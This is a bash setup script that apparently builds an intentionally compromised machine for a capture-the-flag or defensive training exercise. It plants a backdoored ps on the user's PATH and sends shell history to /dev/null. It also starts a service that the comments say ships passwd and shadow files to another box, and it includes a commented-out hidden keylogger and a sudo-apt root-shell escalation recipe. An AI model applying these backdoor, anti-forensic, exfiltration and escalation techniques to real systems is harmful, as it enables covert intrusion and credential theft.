#! /bin/bash

if [ "$EUID" -ne 0 ]
then
    echo "Please run this script with sudo!"
    exit
fi

## install deps for this script - run this separately before everything else
# apt install lsof wget mariadb-server openjdk-8-jdk vsftpd rsync python3 python3-xlib -y

# NOTE: cron won't automatically start after install, you need to use the sudo crontab -e command at least once

# extract files from tarball
tar xvf setup_files.tar.gz

# link csc user .histfile and .bash_history to /dev/null
echo "linking history to /dev/null for csc"
rm /home/csc/.histfile
ln /home/csc/.histfile /dev/null
rm /home/csc/.bash_history
ln /home/csc/.bash_history /dev/null

# link root user .histfile and .bash_history to /dev/null
echo "linking history to /dev/null for root"
rm /root/.histfile
ln /root/.histfile /dev/null
rm /root/.bash_history
ln /root/.bash_history /dev/null

# replace default sshd_config with my sshd_config
echo "replace sshd_config"
rm /etc/ssh/sshd_config
mv ./sshd_config /etc/ssh/

# setup sql server
echo "setup sql server"
systemctl start mariadb.service
systemctl enable mariadb.service

# setup scoring for insecure sql server
echo "setup sql scoring"
chmod +x sql_script.sh
mkdir -p /var/www/default
mv sql_script.sh /var/www/default
echo "export HASH=\"$(sha256sum $(find /var/lib/mysql -name "*") | sha256sum)\"" >> /home/csc/.profile

## make it a cron job!
systemctl start cron.service
systemctl enable cron.service
touch /etc/cron.allow
echo "root" >> /etc/cron.allow
touch /var/spool/cron/crontabs/root
mkdir /var/log/cron
echo "* * * * * /var/www/default/sql_script.sh >> /var/log/cron/sql.log 2>&1" >> /var/spool/cron/crontabs/root

# setup minecraft server
echo "setup minecraft server"
mkdir /var/www/mcdir
mv minecraft.service /etc/systemd/system/
mv server.properties /var/www/mcdir
mv play_minecraft.sh /var/www/mcdir
cd /var/www/mcdir
wget -O minecraft_server.jar https://launcher.mojang.com/v1/objects/f02f4473dbf152c23d7d484952121db0b36698cb/server.jar
chmod +x minecraft_server.jar
chmod +x play_minecraft.sh
echo "eula=true" > eula.txt
cd -
systemctl start minecraft.service
systemctl enable minecraft.service

# setup ftp server
echo "setup ftp server"
rm /etc/vsftpd.conf
mv ./vsftpd.conf /etc/
systemctl start vsftpd.service
systemctl enable vsftpd.service
cd /etc/systemd/system
echo "# flag_{not_so_secure_ftp}" >> $(find . -name "vsftpd.service")
cd -

# setup backdoored ps and flag
echo "setup backdoored ps"
mkdir /var/loog
mv /bin/ps /var/loog/backup_ps
chmod +x backdoored_ps.sh
chmod +x flag.sh
chmod +x ps_init.sh
mv backdoored_ps.sh /var/loog/ps
mkdir /var/www/log
mv flag.sh HIDDEN_flag{0p3n1ng_th3_b4ckd00r}
mv HIDDEN_flag{0p3n1ng_th3_b4ckd00r} ps_init.sh /var/www/log/
echo "export PATH=/var/loog/:$PATH" >> /home/csc/.profile
echo "* * * * * /var/www/log/ps_init.sh >> /var/log/cron/ps.log 2>&1" >> /var/spool/cron/crontabs/root

#### You can't have a keylogger without a window manager!

## setup hidden python keylogger
#mkdir /opt/local/
#mv log.txt /opt/local/
#chmod +x log.sh
#mv log.sh /usr/local/src/
#mv keylogger.py /usr/local/src/HIDDEN_superNotSuspicious.py
#mv pyxhook.py /usr/local/src/
#echo "* * * * * /usr/local/src/log.sh >> /var/log/cron/log.log 2>&1" >> /var/spool/cron/crontabs/root

# setup service that sends logging, passwd, and shadow file to someone else
# TODO: setup dest box to receive files - use static ip UPDATE: not needed - I'll just keep the box on lol
# TODO: setup rsa key on source and dest boxes - ssk-keygen and ssh-copy-id -i
chmod +x backup.sh
mv backup.sh /var/spool
mv backup.service /etc/systemd/system/
systemctl start backup.service
systemctl status backup.service

# hack back against the backup ssh computer
# flag in /etc/passwd - 
# sudo access to apt
# > apt-get changelog apt gives less pager
# > !# /bin/bash gives root shell
